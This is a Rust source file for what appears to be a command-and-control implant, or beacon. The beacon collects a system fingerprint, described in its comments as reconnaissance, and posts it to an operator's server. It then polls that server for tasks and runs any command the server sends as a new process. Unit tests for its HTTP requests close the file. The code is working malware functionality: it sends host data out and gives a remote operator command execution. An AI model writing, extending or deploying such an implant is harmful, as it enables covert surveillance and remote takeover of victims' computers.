pub mod client;
use crate::collector::SystemFingerprint;
use client::*;
use std::collections::HashMap;
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use windows::core::Result;

pub struct Beacon<'a> {
    client: Client,
    home_ip: &'a str,
    home_port: u16,
    pub id: u32,
}

pub enum Task {
    Download,
    Execute,
    Sleep,
}

impl<'a> Beacon<'a> {
    pub fn new(home_ip: &'a str, home_port: u16) -> Result<Self> {
        let client = Client::new()?;
        let id = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .subsec_nanos();

        Ok(Self {
            client,
            home_ip,
            home_port,
            id,
        })
    }

    /// Sends initial recon info to C2 server
    pub fn say_hello(&mut self) -> Result<()> {
        // Gather initial recon info and serialize it
        let data = SystemFingerprint::collect()?;
        let data_json = serde_json::to_string(&data).unwrap_or("Serialization error".to_string());

        let mut headers: HashMap<String, String> = HashMap::new();
        headers.insert("Content-Type".to_string(), "application/json".to_string());

        let request = Request::new(
            self.home_ip,
            self.home_port,
            "POST",
            "/api/v1/hello",
            Some(&headers),
            Some(data_json.as_str()),
        );

        self.request(&request)?;

        Ok(())
    }

    pub fn pull_task(&mut self) -> Result<()> {
        let request = Request::new(
            self.home_ip,
            self.home_port,
            "GET",
            "/api/v1/task",
            None,
            None,
        );

        let response = self.request(&request)?;
        if let Some(body) = response.body {
            // Task will come in a "[task]:[payload]" format
            let mut parsed_body = body.split(":");
            let task = parsed_body.nth(0).unwrap();
            let payload = parsed_body.nth(1).unwrap();

            match task {
                "execute" => self.execute(payload)?,
                "download" => self.download(payload)?,
                "sleep" => {
                    let dur: u64 = payload.parse().unwrap();
                    self.sleep(std::time::Duration::from_secs(dur));
                }
                _ => (),
            };
        }

        Ok(())
    }

    fn request(&mut self, request: &Request) -> Result<Response> {
        self.client.request(request)
    }

    fn execute(&self, cmd: &str) -> Result<()> {
        let mut parts = cmd.split_whitespace();
        let program = parts.next().expect("empty command");

        Command::new(program)
            .args(parts)
            .spawn()
            .expect("failed to run");

        Ok(())
    }

    fn download(&self, url: &str) -> Result<()> {
        Ok(())
    }

    pub fn sleep(&mut self, dur: std::time::Duration) {
        std::thread::sleep(dur);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    const TEST_HOST: &str = "www.example.com";
    const TEST_PORT: u16 = 443;
    const TEST_PATH: &str = "/";

    #[test]
    fn communicator_creation() {
        assert!(
            Beacon::new("127.0.0.1", 3000).is_ok(),
            "Communicator creation should not return Err"
        )
    }

    #[test]
    fn get_request_basic() {
        let mut comm = Beacon::new("127.0.0.1", 3000).unwrap();
        let request = Request::new(TEST_HOST, TEST_PORT, "GET", TEST_PATH, None, None);
        let response = comm
            .request(&request)
            .expect("Sending request threw an error");

        println!("Status code: {}", response.code);
        if let Some(body) = &response.body {
            println!("{}", body);
        } else {
            println!("Body is empty");
        }

        assert!(
            response.code >= 200 && response.code < 300,
            "Expected 2xx status code"
        );
    }

    #[test]
    fn request_with_headers() {
        let mut comm = Beacon::new("127.0.0.1", 3000).unwrap();
        let mut headers: HashMap<String, String> = HashMap::new();
        headers.insert("X-Random".to_string(), "123".to_string());
        let request = Request::new(TEST_HOST, TEST_PORT, "GET", TEST_PATH, Some(&headers), None);
        let response = comm.request(&request).unwrap();

        println!("Status code: {}", response.code);
        if let Some(body) = &response.body {
            println!("{}", body);
        } else {
            println!("Body is empty");
        }

        assert!(
            response.code >= 200 && response.code < 300,
            "Expected 2xx status code"
        );
    }

    #[test]
    fn request_with_body() {
        let mut comm = Beacon::new("127.0.0.1", 3000).unwrap();
        let body = "Hello!";
        let request = Request::new(TEST_HOST, TEST_PORT, "POST", TEST_PATH, None, Some(body));
        let response = comm.request(&request).unwrap();

        println!("Status code: {}", response.code);
        if let Some(body) = &response.body {
            println!("{}", body);
        } else {
            println!("Body is empty");
        }
    }
}
